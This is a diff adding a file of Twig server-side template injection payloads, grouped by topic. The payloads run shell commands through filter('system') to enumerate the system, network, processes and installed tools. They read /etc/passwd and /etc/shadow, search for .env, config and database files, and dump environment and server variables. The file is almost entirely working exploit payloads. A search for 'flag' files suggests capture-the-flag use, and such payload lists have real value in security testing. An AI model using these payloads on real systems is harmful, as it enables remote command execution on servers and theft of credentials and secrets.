@@ -1,0 +1,69 @@
+# System Information
+{{['uname -a']|filter('system')}}
+{{['cat /etc/os-release']|filter('system')}}
+{{['hostname']|filter('system')}}
+{{['id']|filter('system')}}
+{{['whoami']|filter('system')}}
+{{['groups']|filter('system')}}
+{{['ifconfig']|filter('system')}}
+{{['ip addr']|filter('system')}}
+{{['netstat -tulpn']|filter('system')}}
+{{['route -n']|filter('system')}}
+{{['ps aux']|filter('system')}}
+{{['top -bn1']|filter('system')}}
+
+# PHP Information
+{{dump(phpversion())}}
+{{dump(php_uname())}}
+{{dump(php_sapi_name())}}
+{{dump(get_loaded_extensions())}}
+{{dump(ini_get_all())}}
+{{['php -r "phpinfo();"']|filter('system')}}
+{{dump(ini_get('disable_functions'))}}
+
+# File System Enumeration
+{{['ls -la /']|filter('system')}}
+{{['ls -la /home']|filter('system')}}
+{{['ls -la /var/www']|filter('system')}}
+{{['ls -la /tmp']|filter('system')}}
+{{['ls -la /etc']|filter('system')}}
+{{['find / -name "*flag*" 2>/dev/null']|filter('system')}}
+{{['find / -name "*.php" 2>/dev/null | head -20']|filter('system')}}
+{{['find / -name "*.conf" 2>/dev/null']|filter('system')}}
+{{['find / -name ".env" 2>/dev/null']|filter('system')}}
+{{['cat /etc/passwd']|filter('system')}}
+{{['cat /etc/hosts']|filter('system')}}
+{{['cat /etc/crontab']|filter('system')}}
+{{['cat /etc/shadow']|filter('system')}}
+{{file_get_contents('/etc/passwd')}}
+{{file('/etc/passwd')|join}}
+{{readfile('/etc/passwd')}}
+{{['cat /proc/1/cgroup | grep docker']|filter('system')}}
+{{['ls -la /.dockerenv']|filter('system')}}
+{{['cat /proc/self/status']|filter('system')}}
+
+# Application Information
+{{_self}}
+{{_self.env}}
+{{dump(app)}}
+{{dump(app.request.server.all)}}
+{{dump(_context)}}
+{{dump(_context|keys)}}
+{{dump(_context|values)}}
+{{dump(getenv('PATH'))}}
+{{dump($_SERVER)}}
+{{dump($_ENV)}}
+
+# Database Enumeration
+{{dump(function_exists('mysql_connect'))}}
+{{dump(class_exists('mysqli'))}}
+{{dump(extension_loaded('pdo_mysql'))}}
+{{dump(extension_loaded('pgsql'))}}
+{{dump(extension_loaded('pdo_pgsql'))}}
+{{['find / -name "*.sql" 2>/dev/null']|filter('system')}}
+{{['find / -name "*.db" 2>/dev/null']|filter('system')}}
+
+# Installed Software
+{{['dpkg -l | head -20']|filter('system')}}
+{{['rpm -qa | head -20']|filter('system')}}
+{{['which nc wget curl python perl gcc']|filter('system')}}
